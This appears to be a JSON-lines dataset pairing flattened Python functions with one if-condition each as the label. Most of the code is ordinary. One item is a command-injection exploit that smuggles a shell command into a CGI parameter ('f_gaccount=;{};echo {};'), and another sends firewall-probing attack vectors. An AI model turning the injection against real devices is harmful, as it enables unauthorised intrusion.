{"input": "def get_ld_header_info(p): # \"nested-function, but placed at module level # as an ld_header was found, return known paths, archives and members # these lines start with a digit info = [] for line in p.stdout: if re.match(\"[0-9]\", line): info.append(line) else: # blank line (separator), consume line and end for loop break return info", "label": "if re . match ( \"[0-9]\" , line ) :"}
{"input": "def write(self, s): if self.closed: raise ValueError(\"write to closed file\") if type(s) not in (unicode, str, bytearray): # See issue #19481 if isinstance(s, unicode): s = unicode.__getitem__(s, slice(None)) elif isinstance(s, str): s = str.__str__(s) elif isinstance(s, bytearray): s = bytearray.__str__(s) else: raise TypeError(\"must be string, not \" + type(s).__name__) return self.shell.write(s, self.tags)", "label": "if isinstance ( s , unicode ) :"}
{"input": "def generate_forwards(cls, attrs): # forward functions of _forwards for attr_name, attr in cls._forwards.__dict__.items(): if attr_name.startswith(\"_\") or attr_name in attrs: continue if isinstance(attr, property): cls._forward.append(attr_name) elif isinstance(attr, types.FunctionType): wrapper = _forward_factory(cls, attr_name, attr) setattr(cls, attr_name, wrapper) else: raise TypeError(attr_name, type(attr))", "label": "if attr_name . startswith ( \"_\" ) or attr_name in attrs :"}
{"input": "def _user_has_dnd(bot, user_id): try: return bot.call_shared(\"dnd.user_check\", user_id) # shared dnd check except KeyError: logger.warning(\"mentions: falling back to legacy _user_has_dnd()\") initiator_has_dnd = False if bot.memory.exists([\"donotdisturb\"]): donotdisturb = bot.memory.get(\"donotdisturb\") if user_id in donotdisturb: initiator_has_dnd = True return initiator_has_dnd", "label": "if bot . memory . exists ( [ \"donotdisturb\" ] ) :"}
{"input": "def init(self): \"\"\"Initialize a fighter from the database and validate\"\"\" self.__item = None if self.itemID: self.__item = eos.db.getItem(self.itemID) if self.__item is None: pyfalog.error(\"Item (id: {0}) does not exist\", self.itemID) return if self.isInvalid: pyfalog.error(\"Item (id: {0}) is not a Fighter\", self.itemID) return self.build()", "label": "if self . __item is None :"}
{"input": "def _pg_sku_name_validator(sku_name, sku_info, tier): if sku_name: skus = get_postgres_skus(sku_info, tier) if sku_name not in skus: error_msg = ( \"Incorrect value for --sku-name. \" + \"The SKU name does not match {} tier. Specify --tier if you did not. \".format( tier ) ) raise CLIError(error_msg + \"Allowed values : {}\".format(skus))", "label": "if sku_name not in skus :"}
{"input": "def _parse_paternity_log(writer, file): parent_map = {} parent_map[0] = 0 for line in file.read().decode(\"utf-8\").split(\"\\n\"): if not line: continue elems = line.split(\" \") # <Child> <Parent> if len(elems) >= 2: # print \"paternity of %d is %d\" % (int(elems[0]), int(elems[1])) parent_map[int(elems[0])] = int(elems[1]) else: print(\"Odd paternity line '%s'\" % (line)) return parent_map", "label": "if not line :"}
{"input": "def _get_next_cap(self): # type: () -> bool self._curr_cap = None if self._curr_cap_idx is None: self._curr_cap_idx = 0 self._curr_cap = self._cap_list[0] return True else: if not (self._curr_cap_idx + 1) < len(self._cap_list): self._end_of_video = True return False self._curr_cap_idx += 1 self._curr_cap = self._cap_list[self._curr_cap_idx] return True", "label": "if not ( self . _curr_cap_idx + 1 ) < len ( self . _cap_list ) :"}
{"input": "def decode_payload(args): try: if args.token: token = args.token else: if sys.stdin.isatty(): token = sys.stdin.readline().strip() else: raise IOError(\"Cannot read from stdin: terminal not a TTY\") token = token.encode(\"utf-8\") data = decode(token, key=args.key, verify=args.verify) return json.dumps(data) except DecodeError as e: raise DecodeError(\"There was an error decoding the token: %s\" % e)", "label": "if sys . stdin . isatty ( ) :"}
{"input": "def cell_double_clicked(self, row, column): if column == 3: archive_name = self.selected_archive_name() if not archive_name: return mount_point = self.mount_points.get(archive_name) if mount_point is not None: QDesktopServices.openUrl(QtCore.QUrl(f\"file:///{mount_point}\"))", "label": "if not archive_name :"}
{"input": "def tiles_around(self, pos, radius=1, predicate=None): ps = [] x, y = pos for dx in range(-radius, radius + 1): nx = x + dx if nx >= 0 and nx < self.width: for dy in range(-radius, radius + 1): ny = y + dy if ny >= 0 and ny < self.height and (dx != 0 or dy != 0): if predicate is None or predicate((nx, ny)): ps.append((nx, ny)) return ps", "label": "if nx >= 0 and nx < self . width :"}
{"input": "def __init__(self, type, data, name=None): Constant.__init__(self, type, data, name) self.tag.unique_value = None if isinstance(data, np.ndarray) and data.ndim > 0: flat_data = data.ravel() if flat_data.shape[0]: if (flat_data == flat_data[0]).all(): self.tag.unique_value = flat_data[0]", "label": "if ( flat_data == flat_data [ 0 ] ) . all ( ) :"}
{"input": "def git_convert_standalone_clone(repodir): \"\"\"If specified directory is a git repository, ensure it's a standalone clone\"\"\" import bb.process if os.path.exists(os.path.join(repodir, \".git\")): alternatesfile = os.path.join(repodir, \".git\", \"objects\", \"info\", \"alternates\") if os.path.exists(alternatesfile): # This will have been cloned with -s, so we need to convert it so none # of the contents is shared bb.process.run(\"git repack -a\", cwd=repodir) os.remove(alternatesfile)", "label": "if os . path . exists ( alternatesfile ) :"}
{"input": "def _rename_recipe_file(oldrecipe, bpn, oldpv, newpv, path): oldrecipe = os.path.basename(oldrecipe) if oldrecipe.endswith(\"_%s.bb\" % oldpv): newrecipe = \"%s_%s.bb\" % (bpn, newpv) if oldrecipe != newrecipe: shutil.move(os.path.join(path, oldrecipe), os.path.join(path, newrecipe)) else: newrecipe = oldrecipe return os.path.join(path, newrecipe)", "label": "if oldrecipe != newrecipe :"}
{"input": "def profiling_startup(): if \"--profile-sverchok-startup\" in sys.argv: global _profile_nesting profile = None try: profile = get_global_profile() _profile_nesting += 1 if _profile_nesting == 1: profile.enable() yield profile finally: _profile_nesting -= 1 if _profile_nesting == 0 and profile is not None: profile.disable() dump_stats(file_path=\"sverchok_profile.txt\") save_stats(\"sverchok_profile.prof\") else: yield None", "label": "if _profile_nesting == 1 :"}
{"input": "def to_scaled_dtype(val): \"\"\"Parse *val* to return a dtype.\"\"\" res = [] for i in val: if i[1].startswith(\"S\"): res.append((i[0], i[1]) + i[2:-1]) else: try: res.append((i[0], i[-1].dtype) + i[2:-1]) except AttributeError: res.append((i[0], type(i[-1])) + i[2:-1]) return np.dtype(res)", "label": "if i [ 1 ] . startswith ( \"S\" ) :"}
{"input": "def row(self, indx): if indx not in self.__rows: if indx in self.__flushed_rows: raise Exception( \"Attempt to reuse row index %d of sheet %r after flushing\" % (indx, self.__name) ) self.__rows[indx] = self.Row(indx, self) if indx > self.last_used_row: self.last_used_row = indx if indx < self.first_used_row: self.first_used_row = indx return self.__rows[indx]", "label": "if indx > self . last_used_row :"}
{"input": "def _flow_open(self): rv = [] for pipe in self.pipes: if pipe._pipeline_all_methods_.issuperset({\"open\", self._method_open}): raise RuntimeError( f\"{pipe.__class__.__name__} pipe has double open methods.\" f\" Use `open` or `{self._method_open}`, not both.\" ) if \"open\" in pipe._pipeline_all_methods_: rv.append(pipe.open) if self._method_open in pipe._pipeline_all_methods_: rv.append(getattr(pipe, self._method_open)) return rv", "label": "if pipe . _pipeline_all_methods_ . issuperset ( { \"open\" , self . _method_open } ) :"}
{"input": "def _parse_output(output, strict=False): for pkg in _yum_pkginfo(output): if strict and (pkg.repoid not in repos or not _check_args(args, pkg.name)): continue repo_dict = ret.setdefault(pkg.repoid, {}) version_list = repo_dict.setdefault(pkg.name, set()) version_list.add(pkg.version)", "label": "if strict and ( pkg . repoid not in repos or not _check_args ( args , pkg . name ) ) :"}
{"input": "def user_defined_os(): if menu.options.os: if menu.options.os.lower() == \"windows\": settings.TARGET_OS = \"win\" return True elif menu.options.os.lower() == \"unix\": return True else: err_msg = \"You specified wrong value '\" + menu.options.os + \"' \" err_msg += \"as an operation system. The value, must be 'Windows' or 'Unix'.\" print(settings.print_critical_msg(err_msg)) raise SystemExit()", "label": "elif menu . options . os . lower ( ) == \"unix\" :"}
{"input": "def update(self, topLeft, bottomRight): if self._updating: # We are currently putting data in the model, so no updates return if self._index: if topLeft.row() <= self._index.row() <= bottomRight.row(): self.updateText() elif self._indexes: update = False for i in self._indexes: if topLeft.row() <= i.row() <= bottomRight.row(): update = True if update: self.updateText()", "label": "if topLeft . row ( ) <= i . row ( ) <= bottomRight . row ( ) :"}
{"input": "def _wrapper(self, pipe, _should_terminate_flag, generator, *args, **kwargs): \"\"\"Executed in background, pipes generator results to foreground\"\"\" logger.debug(\"Entering _wrapper\") try: for datum in generator(*args, **kwargs): if _should_terminate_flag.value: raise EarlyCancellationError(\"Task was cancelled\") pipe.send(datum) except Exception as e: if not isinstance(e, EarlyCancellationError): pipe.send(e) import traceback logger.warning(traceback.format_exc()) else: pipe.send(StopIteration()) finally: pipe.close() logger.debug(\"Exiting _wrapper\")", "label": "if _should_terminate_flag . value :"}
{"input": "def _flatten(*args): arglist = [] for arg in args: if isinstance(arg, _Block): if arg.vhdl_code is not None: arglist.append(arg.vhdl_code) continue else: arg = arg.subs if id(arg) in _userCodeMap[\"vhdl\"]: arglist.append(_userCodeMap[\"vhdl\"][id(arg)]) elif isinstance(arg, (list, tuple, set)): for item in arg: arglist.extend(_flatten(item)) else: arglist.append(arg) return arglist", "label": "if arg . vhdl_code is not None :"}
{"input": "def _get_target_and_lun(self, context, volume): iscsi_target = 0 if not self.target_name or not self._get_group(): lun = 1 return iscsi_target, lun luns = self._get_luns_info() if (not luns) or (luns[0] != 1): lun = 1 return iscsi_target, lun else: for lun in luns: if (luns[-1] == lun) or (luns[lun - 1] + 1 != luns[lun]): return iscsi_target, (lun + 1)", "label": "if ( luns [ - 1 ] == lun ) or ( luns [ lun - 1 ] + 1 != luns [ lun ] ) :"}
{"input": "def check_find(ref): # Check find returns indexes for single point codes for c in set(m.used): start = 0 u = m.text while start < m.size: i = u.find(c, start) if i < 0: break self.assertEqual(u[i], c) self.assertGreaterEqual(i, start) start = i + 1", "label": "if i < 0 :"}
{"input": "def _format_column_list(self, data): # Now we have all lis of columns which we need # to include in our create definition, Let's format them if \"columns\" in data: for c in data[\"columns\"]: if \"attacl\" in c: c[\"attacl\"] = parse_priv_to_db(c[\"attacl\"], self.column_acl) # check type for '[]' in it if \"cltype\" in c: c[\"cltype\"], c[\"hasSqrBracket\"] = column_utils.type_formatter( c[\"cltype\"] )", "label": "if \"attacl\" in c :"}
{"input": "def _animate_strategy(self, speed=1): if self._animating == 0: return if self._apply_strategy() is not None: if self._animate.get() == 0 or self._step.get() == 1: return if self._animate.get() == 1: self._root.after(3000, self._animate_strategy) elif self._animate.get() == 2: self._root.after(1000, self._animate_strategy) else: self._root.after(20, self._animate_strategy)", "label": "if self . _animate . get ( ) == 1 :"}
{"input": "def close_all(map=None, ignore_all=False): if map is None: # pragma: no cover map = socket_map for x in list(map.values()): # list() FBO py3 try: x.close() except OSError as x: if x.args[0] == EBADF: pass elif not ignore_all: raise except _reraised_exceptions: raise except: if not ignore_all: raise map.clear()", "label": "if not ignore_all :"}
{"input": "def iter_imports(path): \"\"\"Yield imports in *path*\"\"\" for node in ast.parse(open(path, \"rb\").read()).body: if isinstance(node, ast.ImportFrom): if node.module is None: prefix = () else: prefix = tuple(node.module.split(\".\")) for snode in node.names: yield (node.level, prefix + (snode.name,)) elif isinstance(node, ast.Import): for node in node.names: yield (0, tuple(node.name.split(\".\")))", "label": "elif isinstance ( node , ast . Import ) :"}
{"input": "def one_stage_eval_model(data_reader_eval, myModel, loss_criterion=None): score_tot = 0 n_sample_tot = 0 loss_tot = 0 for idx, batch in enumerate(data_reader_eval): score, loss, n_sample = compute_a_batch( batch, myModel, eval_mode=True, loss_criterion=loss_criterion ) score_tot += score n_sample_tot += n_sample if loss is not None: loss_tot += loss.data[0] * n_sample return score_tot / n_sample_tot, loss_tot / n_sample_tot, n_sample_tot", "label": "if loss is not None :"}
{"input": "def _process_preproc(self, token, content): if self.state == \"include\": if content != \"\\n\" and content != \"#\": content = content.strip().strip('\"').strip(\"<\").strip(\">\").strip() self.append(content, truncate=True, separator=\"/\") self.state = None elif content.strip().startswith(\"include\"): self.state = \"include\" else: self.state = None", "label": "if content != \"\\n\" and content != \"#\" :"}
{"input": "def _aggregate_metadata_attribute( self, attr, agg_func=np.max, default_value=0, from_type_metadata=True ): attr_values = [] for a in self.appliances: if from_type_metadata: attr_value = a.type.get(attr) else: attr_value = a.metadata.get(attr) if attr_value is not None: attr_values.append(attr_value) if len(attr_values) == 0: return default_value else: return agg_func(attr_values)", "label": "if attr_value is not None :"}
{"input": "def _remove(self, item): \"\"\"Internal removal of an item\"\"\" # Manage siblings when items are deleted for sibling in self.lines[self.lines.index(item) + 1 :]: if isinstance(sibling, CronItem): env = sibling.env sibling.env = item.env sibling.env.update(env) sibling.env.job = sibling break elif sibling == \"\": self.lines.remove(sibling) else: break self.crons.remove(item) self.lines.remove(item) return 1", "label": "elif sibling == \"\" :"}
{"input": "def _validate_command_chain(self) -> None: \"\"\"Validate command-chain names.\"\"\" # Would normally get caught/handled by schema validation. for command in self.command_chain: if not re.match(\"^[A-Za-z0-9/._#:$-]*$\", command): raise HookValidationError( hook_name=self.hook_name, message=f\"{command!r} is not a valid command-chain command.\", )", "label": "if not re . match ( \"^[A-Za-z0-9/._#:$-]*$\" , command ) :"}
{"input": "def _handle_unpaired_tag(self, html_tag): self.handle_ignore(html_tag, is_open=False) jannotations = self.read_jannotations(html_tag) for jannotation in arg_to_iter(jannotations): if self.unpairedtag_stack: self._close_unpaired_tag() self.extra_required_attrs.extend(jannotation.pop(\"required\", [])) annotation = self.build_annotation(jannotation) self.handle_variant(annotation, is_open=False) self.annotations.append(annotation) self.next_tag_index += 1", "label": "if self . unpairedtag_stack :"}
{"input": "def browser(self): if not hasattr(self, \"_browser\"): self.loop = asyncio.get_event_loop() if self.loop.is_running(): raise RuntimeError( \"Cannot use HTMLSession within an existing event loop. Use AsyncHTMLSession instead.\" ) self._browser = self.loop.run_until_complete(super().browser) return self._browser", "label": "if self . loop . is_running ( ) :"}
{"input": "def process(self, node): self.vars = [] for child in node.childNodes: if child.nodeType == node.ELEMENT_NODE: child_text = get_xml_text(child) if child_text == \"\": # pragma:nocover continue if child.nodeName == \"Real\": for val in re.split(\"[\\t ]+\", child_text): self.vars.append(1.0 * eval(val)) return self", "label": "if child_text == \"\" :"}
{"input": "def instantiate(self, node, container=None): var = self.vm.program.NewVariable() if container and ( not isinstance(container, SimpleValue) or self.full_name in container.all_template_names ): instance = TypeParameterInstance(self, container, self.vm) return instance.to_variable(node) else: for c in self.constraints: var.PasteVariable(c.instantiate(node, container)) if self.bound: var.PasteVariable(self.bound.instantiate(node, container)) if not var.bindings: var.AddBinding(self.vm.convert.unsolvable, [], node) return var", "label": "if self . bound :"}
{"input": "def compare_tables(self, db1, db2): i1 = db1.query(\"SELECT id, buf FROM test ORDER BY id\") i2 = db2.query(\"SELECT id, buf FROM test ORDER BY id\") for (id1, buf1) in i1: (id2, buf2) = next(i2) self.assertEqual(id1, id2) if isinstance(buf1, float): self.assertAlmostEqual(buf1, buf2, places=9) else: self.assertEqual(buf1, buf2) self.assertRaises(StopIteration, i2.__next__)", "label": "if isinstance ( buf1 , float ) :"}
{"input": "def list_full_file_paths(directory): \"\"\"List the absolute paths of files in |directory|.\"\"\" directory_absolute_path = os.path.abspath(directory) paths = [] for relative_path in os.listdir(directory): absolute_path = os.path.join(directory_absolute_path, relative_path) if os.path.isfile(absolute_path): # Only return paths to files. paths.append(absolute_path) return paths", "label": "if os . path . isfile ( absolute_path ) :"}
{"input": "def reparentChildren(self, newParent): while self.element.contents: child = self.element.contents[0] child.extract() if isinstance(child, Tag): newParent.appendChild(Element(child, self.soup, namespaces[\"html\"])) else: newParent.appendChild(TextNode(child, self.soup))", "label": "if isinstance ( child , Tag ) :"}
{"input": "def sort(self): sorted_models = [] concrete_models = set() models = list(self.data) while len(sorted_models) < len(models): found = False for model in models: if model in sorted_models: continue dependencies = self.dependencies.get(model._meta.concrete_model) if not (dependencies and dependencies.difference(concrete_models)): sorted_models.append(model) concrete_models.add(model._meta.concrete_model) found = True if not found: return self.data = OrderedDict((model, self.data[model]) for model in sorted_models)", "label": "if not found :"}
{"input": "def template(self): \"\"\"template property\"\"\" if self._template is None: results = self._process(self.name, False, self.params, self.data) if results[\"returncode\"] != 0: raise OpenShiftCLIError( \"Error processing template [%s]: %s\" % (self.name, results) ) self._template = results[\"results\"][\"items\"] return self._template", "label": "if results [ \"returncode\" ] != 0 :"}
{"input": "def edit_file(self, filename): import subprocess editor = self.get_editor() if self.env: environ = os.environ.copy() environ.update(self.env) else: environ = None try: c = subprocess.Popen('%s \"%s\"' % (editor, filename), env=environ, shell=True) exit_code = c.wait() if exit_code != 0: raise Exception(\"%s: Editing failed!\" % editor) except OSError as e: raise Exception(\"%s: Editing failed: %s\" % (editor, e))", "label": "if exit_code != 0 :"}
{"input": "def test01e_json(self): \"Testing GeoJSON input/output.\" from django.contrib.gis.gdal.prototypes.geom import GEOJSON if not GEOJSON: return for g in self.geometries.json_geoms: geom = OGRGeometry(g.wkt) if not hasattr(g, \"not_equal\"): self.assertEqual(g.json, geom.json) self.assertEqual(g.json, geom.geojson) self.assertEqual(OGRGeometry(g.wkt), OGRGeometry(geom.json))", "label": "if not hasattr ( g , \"not_equal\" ) :"}
{"input": "def debug(self): feed_dict = self.get_test_feed_dict() while True: tensor_name = input(\"Input debug tensor name: \").strip() if tensor_name == \"q\": sys.exit(0) try: debug_tensor = self.graph.get_tensor_by_name(tensor_name) except Exception as e: logging.error(e) continue res = self.sess.run(debug_tensor, feed_dict=feed_dict) logging.info(f\"Result for tensor {tensor_name} is: {res}\")", "label": "if tensor_name == \"q\" :"}
{"input": "def get_location(self, dist, dependency_links): for url in dependency_links: egg_fragment = Link(url).egg_fragment if not egg_fragment: continue if \"-\" in egg_fragment: ## FIXME: will this work when a package has - in the name? key = \"-\".join(egg_fragment.split(\"-\")[:-1]).lower() else: key = egg_fragment if key == dist.key: return url.split(\"#\", 1)[0] return None", "label": "if key == dist . key :"}
{"input": "def select(result): for elem in result: parent = elem.getparent() if parent is None: continue try: # FIXME: what if the selector is \"*\" ? elems = list(parent.iterchildren(elem.tag)) if elems[index] is elem: yield elem except IndexError: pass", "label": "if parent is None :"}
{"input": "def execute(self, cmd): mark = utils.random_text(32) path = \"/cgi-bin/gdrive.cgi?cmd=4&f_gaccount=;{};echo {};\".format(cmd, mark) response = self.http_request( method=\"GET\", path=path, ) if response is None: return \"\" if mark in response.text: regexp = \"(|.+?){}\".format(mark) res = re.findall(regexp, response.text, re.DOTALL) if len(res): return res[0] return \"\"", "label": "if len ( res ) :"}
{"input": "def join(s, *p): path = s for t in p: if (not s) or isabs(t): path = t continue if t[:1] == \":\": t = t[1:] if \":\" not in path: path = \":\" + path if path[-1:] != \":\": path = path + \":\" path = path + t return path", "label": "if t [ : 1 ] == \":\" :"}
{"input": "def do_remove(self): if self.netconf.locked(\"dhcp\"): if not self.pid: pid = read_pid_file(\"/var/run/udhcpd.pan1.pid\") else: pid = self.pid if not kill(pid, \"udhcpd\"): logging.info(\"Stale dhcp lockfile found\") self.netconf.unlock(\"dhcp\")", "label": "if not kill ( pid , \"udhcpd\" ) :"}
{"input": "def filter_packages(query, package_infos): if query is None: return package_infos try: if \"!\" in query: raise ConanException(\"'!' character is not allowed\") if \" not \" in query or query.startswith(\"not \"): raise ConanException(\"'not' operator is not allowed\") postfix = infix_to_postfix(query) if query else [] result = OrderedDict() for package_id, info in package_infos.items(): if _evaluate_postfix_with_info(postfix, info): result[package_id] = info return result except Exception as exc: raise ConanException(\"Invalid package query: %s. %s\" % (query, exc))", "label": "if _evaluate_postfix_with_info ( postfix , info ) :"}
{"input": "def __add__(self, other): if isinstance(other, Vector3): # Vector + Vector -> Vector # Vector + Point -> Point # Point + Point -> Vector if self.__class__ is other.__class__: _class = Vector3 else: _class = Point3 return _class(self.x + other.x, self.y + other.y, self.z + other.z) else: assert hasattr(other, \"__len__\") and len(other) == 3 return Vector3(self.x + other[0], self.y + other[1], self.z + other[2])", "label": "if self . __class__ is other . __class__ :"}
{"input": "def test_scout(): test_status = False with open(\"/tmp/test_scout_output\", \"w\") as logfile: if not DockerImage: logfile.write(\"No $AMBASSADOR_DOCKER_IMAGE??\\n\") else: if docker_start(logfile): if wait_for_diagd(logfile) and check_chimes(logfile): test_status = True docker_kill(logfile) if not test_status: with open(\"/tmp/test_scout_output\", \"r\") as logfile: for line in logfile: print(line.rstrip()) assert test_status, \"test failed\"", "label": "if docker_start ( logfile ) :"}
{"input": "def visit_Assign(self, node): \"\"\"Handle visiting an assignment statement.\"\"\" ups = set() for targ in node.targets: if isinstance(targ, (Tuple, List)): ups.update(leftmostname(elt) for elt in targ.elts) elif isinstance(targ, BinOp): newnode = self.try_subproc_toks(node) if newnode is node: ups.add(leftmostname(targ)) else: return newnode else: ups.add(leftmostname(targ)) self.ctxupdate(ups) return node", "label": "elif isinstance ( targ , BinOp ) :"}
{"input": "def get_config_h_filename(): \"\"\"Returns the path of pyconfig.h.\"\"\" if _PYTHON_BUILD: # The additional check for != \"java\" secures against JyNI-monkeypatching. if os.name == \"nt\" and os.name != \"java\": inc_dir = os.path.join(_PROJECT_BASE, \"PC\") else: inc_dir = _PROJECT_BASE else: inc_dir = get_path(\"platinclude\") return os.path.join(inc_dir, \"pyconfig.h\")", "label": "if os . name == \"nt\" and os . name != \"java\" :"}
{"input": "def is_valid_block(self): \"\"\"check wheter the block is valid in the current position\"\"\" for i in range(self.block.x): for j in range(self.block.x): if self.block.get(i, j): if self.block.pos.x + i < 0: return False if self.block.pos.x + i >= COLUMNS: return False if self.block.pos.y + j < 0: return False if self.map.get((self.block.pos.x + i, self.block.pos.y + j), False): return False return True", "label": "if self . block . pos . x + i >= COLUMNS :"}
{"input": "def __call__(self, execution_result): json_value = execution_result.get_output_in_json() actual_result = jmespath.search( self._query, json_value, jmespath.Options(collections.OrderedDict) ) if not actual_result > self._expected_result: expected_result_format = \"> {}\".format(self._expected_result) if actual_result: raise JMESPathCheckAssertionError( self._query, expected_result_format, actual_result, execution_result.output, ) raise JMESPathCheckAssertionError( self._query, expected_result_format, \"None\", execution_result.output )", "label": "if actual_result :"}
{"input": "def readline(b): a = 1 while True: if b: if b[0]: a = 2 b = None continue b = None a = 5 return a", "label": "if b [ 0 ] :"}
{"input": "def test_execute_magic(self): \"\"\"execute accepts IPython commands\"\"\" view = self.client[:] view.execute(\"a = 5\") ar = view.execute(\"%whos\", block=True) # this will raise, if that failed ar.get(5) for stdout in ar.stdout: lines = stdout.splitlines() self.assertEqual(lines[0].split(), [\"Variable\", \"Type\", \"Data/Info\"]) found = False for line in lines[2:]: split = line.split() if split == [\"a\", \"int\", \"5\"]: found = True break self.assertTrue(found, \"whos output wrong: %s\" % stdout)", "label": "if split == [ \"a\" , \"int\" , \"5\" ] :"}
{"input": "def imgFileProcessingTick(output): if isinstance(output, tuple): workerOutput.append(output) workerPool.terminate() else: for page in output: if page is not None: options.imgMetadata[page[0]] = page[1] options.imgOld.append(page[2]) if GUI: GUI.progressBarTick.emit(\"tick\") if not GUI.conversionAlive: workerPool.terminate()", "label": "if page is not None :"}
{"input": "def _load(xs): ret = [] for x, ctx in zip(xs, context): if isinstance(x, tuple): ret.append([y.as_in_context(ctx) for y in x]) else: ret.append(x.as_in_context(ctx)) return ret", "label": "if isinstance ( x , tuple ) :"}
{"input": "def _is_64bit_os(): global _IS_64BIT_OS if _IS_64BIT_OS is None: if sys.maxsize > 2 ** 32: import platform _IS_64BIT_OS = platform.machine() == \"AMD64\" else: _IS_64BIT_OS = False return _IS_64BIT_OS", "label": "if sys . maxsize > 2 ** 32 :"}
{"input": "def stepStarted(self, step): self.currentStep = step for w in self.watchers: receiver = w.stepStarted(self, step) if receiver: if isinstance(receiver, type(())): step.subscribe(receiver[0], receiver[1]) else: step.subscribe(receiver) d = step.waitUntilFinished() # TODO: This actually looks like a bug, but this code # will be removed anyway. # pylint: disable=cell-var-from-loop d.addCallback(lambda step: step.unsubscribe(receiver)) step.waitUntilFinished().addCallback(self._stepFinished)", "label": "if isinstance ( receiver , type ( ( ) ) ) :"}
{"input": "def connection(self, commit_on_success=False): with self._lock: if self._bulk_commit: if self._pending_connection is None: self._pending_connection = sqlite.connect(self.filename) con = self._pending_connection else: con = sqlite.connect(self.filename) try: if self.fast_save: con.execute(\"PRAGMA synchronous = 0;\") yield con if commit_on_success and self.can_commit: con.commit() finally: if not self._bulk_commit: con.close()", "label": "if commit_on_success and self . can_commit :"}
{"input": "def parse_response(self, response): # read response data from httpresponse, and parse it # Check for new http response object, otherwise it is a file object. if hasattr(response, \"getheader\"): if response.getheader(\"Content-Encoding\", \"\") == \"gzip\": stream = GzipDecodedResponse(response) else: stream = response else: stream = response p, u = self.getparser() while 1: data = stream.read(1024) if not data: break if self.verbose: print(\"body:\", repr(data)) p.feed(data) if stream is not response: stream.close() p.close() return u.close()", "label": "if not data :"}
{"input": "def edge2str(self, nfrom, nto): if isinstance(nfrom, ExprCompose): for i in nfrom.args: if i[0] == nto: return \"[%s, %s]\" % (i[1], i[2]) elif isinstance(nfrom, ExprCond): if nfrom.cond == nto: return \"?\" elif nfrom.src1 == nto: return \"True\" elif nfrom.src2 == nto: return \"False\" return \"\"", "label": "if nfrom . cond == nto :"}
{"input": "def gather_command_line_options(filter_disabled=None): \"\"\"Get a sorted list of all CommandLineOption subclasses.\"\"\" if filter_disabled is None: filter_disabled = not SETTINGS.COMMAND_LINE.SHOW_DISABLED_OPTIONS options = [] for opt in get_inheritors(commandline_options.CommandLineOption): warnings.warn( \"Subclassing `CommandLineOption` is deprecated. Please \" \"use the `sacred.cli_option` decorator and pass the function \" \"to the Experiment constructor.\" ) if filter_disabled and not opt._enabled: continue options.append(opt) options += DEFAULT_COMMAND_LINE_OPTIONS return sorted(options, key=commandline_options.get_name)", "label": "if filter_disabled and not opt . _enabled :"}
{"input": "def handle_disconnect(self): \"\"\"Socket gets disconnected\"\"\" # signal disconnected terminal with control lines try: self.serial.rts = False self.serial.dtr = False finally: # restore original port configuration in case it was changed self.serial.apply_settings(self.serial_settings_backup) # stop RFC 2217 state machine self.rfc2217 = None # clear send buffer self.buffer_ser2net = bytearray() # close network connection if self.socket is not None: self.socket.close() self.socket = None if self.log is not None: self.log.warning(\"{}: Disconnected\".format(self.device))", "label": "if self . log is not None :"}
{"input": "def answers(self, other): if not isinstance(other, TCP): return 0 if conf.checkIPsrc: if not ((self.sport == other.sport) and (self.dport == other.dport)): return 0 if conf.check_TCPerror_seqack: if self.seq is not None: if self.seq != other.seq: return 0 if self.ack is not None: if self.ack != other.ack: return 0 return 1", "label": "if self . ack is not None :"}
{"input": "def _override_options(options, **overrides): \"\"\"Override options.\"\"\" for opt, val in overrides.items(): passed_value = getattr(options, opt, _Default()) if opt in (\"ignore\", \"select\") and passed_value: value = process_value(opt, passed_value.value) value += process_value(opt, val) setattr(options, opt, value) elif isinstance(passed_value, _Default): setattr(options, opt, process_value(opt, val))", "label": "if opt in ( \"ignore\" , \"select\" ) and passed_value :"}
{"input": "def _unlock_restarted_vms(self, pool_name): result = [] for vm in await self.middleware.call(\"vm.query\", [(\"autostart\", \"=\", True)]): for device in vm[\"devices\"]: if device[\"dtype\"] not in (\"DISK\", \"RAW\"): continue path = device[\"attributes\"].get(\"path\") if not path: continue if path.startswith(f\"/dev/zvol/{pool_name}/\") or path.startswith( f\"/mnt/{pool_name}/\" ): result.append(vm) break return result", "label": "if device [ \"dtype\" ] not in ( \"DISK\" , \"RAW\" ) :"}
{"input": "def check_space(arr, task_id): for a in arr: if a.startswith(\"hadoop jar\"): found = False for x in shlex.split(a): if task_id in x: found = True if not found: raise AssertionError", "label": "if a . startswith ( \"hadoop jar\" ) :"}
{"input": "def clean(self): if self.instance: redirect_to = self.data.get(\"redirect_to\", \"\") if redirect_to != \"\": lfs.core.utils.set_redirect_for( self.instance.get_absolute_url(), redirect_to ) else: lfs.core.utils.remove_redirect_for(self.instance.get_absolute_url()) if self.data.get(\"active_base_price\") == str(CHOICES_YES): if self.data.get(\"base_price_amount\", \"\") == \"\": self.errors[\"base_price_amount\"] = ErrorList( [_(u\"This field is required.\")] ) return self.cleaned_data", "label": "if self . data . get ( \"base_price_amount\" , \"\" ) == \"\" :"}
{"input": "def detect(get_page): retval = False for vector in WAF_ATTACK_VECTORS: page, headers, code = get_page(get=vector) retval = ( re.search( r\"\\AAL[_-]?(SESS|LB)=\", headers.get(HTTP_HEADER.SET_COOKIE, \"\"), re.I ) is not None ) if retval: break return retval", "label": "if retval :"}
{"input": "def unloadOnePlugin(self, moduleOrFileName, verbose=False): moduleName = self.regularizeName(moduleOrFileName) if self.isLoaded(moduleName): if verbose: g.pr(\"unloading\", moduleName) del self.loadedModules[moduleName] for tag in self.handlers: bunches = self.handlers.get(tag) bunches = [bunch for bunch in bunches if bunch.moduleName != moduleName] self.handlers[tag] = bunches", "label": "if verbose :"}
{"input": "def __init__(self, **kw): util_schema.validate( instance=kw, schema=self.schema, cls=util_schema.CustomValidator, use_default=False, allow_default_none=True, ) for prop in six.iterkeys(self.schema.get(\"properties\", [])): value = kw.get(prop, None) # special handling for chain property to create the Node object if prop == \"chain\": nodes = [] for node in value: ac_node = Node(**node) ac_node.validate() nodes.append(ac_node) value = nodes setattr(self, prop, value)", "label": "if prop == \"chain\" :"}
{"input": "def initialize(self): for document in self.corpus: frequencies = {} for word in document: if word not in frequencies: frequencies[word] = 0 frequencies[word] += 1 self.f.append(frequencies) for word, freq in iteritems(frequencies): if word not in self.df: self.df[word] = 0 self.df[word] += 1 for word, freq in iteritems(self.df): self.idf[word] = math.log(self.corpus_size - freq + 0.5) - math.log(freq + 0.5)", "label": "if word not in self . df :"}
{"input": "def get_child(self, name): if self.isdir: try: return self.data[name] except: if not self.case_sensitive: for childname, child in list(self.data.items()): if childname.lower() == name.lower(): return child raise", "label": "if not self . case_sensitive :"}
